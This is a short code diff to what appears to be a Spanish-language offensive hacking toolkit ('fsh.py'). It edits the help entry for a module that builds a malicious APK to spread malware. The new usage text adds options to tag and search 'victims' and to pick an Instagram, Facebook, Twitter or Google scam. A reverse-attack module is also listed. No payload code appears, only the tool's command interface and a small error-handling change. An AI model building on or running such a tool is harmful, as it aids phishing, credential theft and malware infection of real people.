@@ -124,11 +124,13 @@ execute_s = {
         "--c: Modo (`F` para inicial, `S` para recursivo, obligatorio)."
     ],
     "sc4pk": [
-        "sc4pk.py", 
-        "a", 
+        sc4pk, 
+        "ab", 
         "[DESCRIPCION]\nGenera un archivo APK malicioso que puede ser usado para propagar malware.\n\n"
-        "[USO]\npython3 fsh.py sc4pk\n\n"
-        "[PARAMETROS]\nSin parámetros adicionales."
+        "[USO]\npython3 fsh.py sc4pk --a <ID_de_seguimiento> --b <ig|fb|tw|go> | Creacion del APK.\n"
+        "python3 fsh.py sc4pk --a <ID_de_seguimiento> | Busqueda de victimas.\n\n"
+        "[PARAMETROS]\n--a: ID asociada a tus victimas (obligatorio).\n"
+        "--b: Scam a usar (ig para Instagram, fb para Facebook, tw para Twitter, go para Google, opcional)"
     ],
     "reverhttp": [
         "reverseatak.py", 
@@ -175,5 +177,5 @@ try:
     else:
         print("[ERROR] Funcion no encontrada...")
 
-except:
-    print("[ERROR] Argumento mal ingresado...")
+except Exception as err:
+    print(err)
